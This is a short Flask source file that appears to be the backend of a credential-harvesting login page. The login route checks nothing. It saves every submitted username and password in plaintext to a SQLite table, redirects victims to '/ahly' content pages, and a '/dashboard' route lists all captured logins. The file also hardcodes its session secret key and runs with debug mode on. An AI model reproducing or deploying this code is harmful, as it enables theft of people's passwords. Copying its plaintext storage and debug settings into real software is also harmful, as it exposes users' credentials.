from flask import Flask, render_template, request, redirect, url_for, session
import sqlite3
from datetime import datetime
import os

app = Flask(__name__)
app.secret_key = "jahannam_secret_🔥"

DB_PATH = "users.db"

def get_db_connection():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    if not os.path.exists(DB_PATH):
        conn = get_db_connection()
        conn.execute('''
            CREATE TABLE IF NOT EXISTS logins (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT,
                password TEXT,
                timestamp TEXT
            )
        ''')
        conn.commit()
        conn.close()

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        conn = get_db_connection()
        conn.execute("INSERT INTO logins (username, password, timestamp) VALUES (?, ?, ?)",
                     (username, password, timestamp))
        conn.commit()
        conn.close()

        session["user"] = username
        return redirect("/ahly")
    
    return render_template("login.html")

@app.route("/ahly")
def ahly():
    if "user" not in session:
        return redirect("/")
    return render_template("ahly.html")

@app.route("/ahly-more")
def ahly_more():
    if "user" not in session:
        return redirect("/")
    return render_template("ahly_extended.html")

@app.route("/dashboard")
def dashboard():
    if "user" not in session:
        return redirect("/")
    
    conn = get_db_connection()
    logins = conn.execute("SELECT * FROM logins ORDER BY timestamp DESC").fetchall()
    conn.close()
    return render_template("dashboard.html", logins=logins)

@app.route("/logout")
def logout():
    session.clear()
    return redirect("/")

if __name__ == "__main__":
    init_db()
    app.run(debug=True)
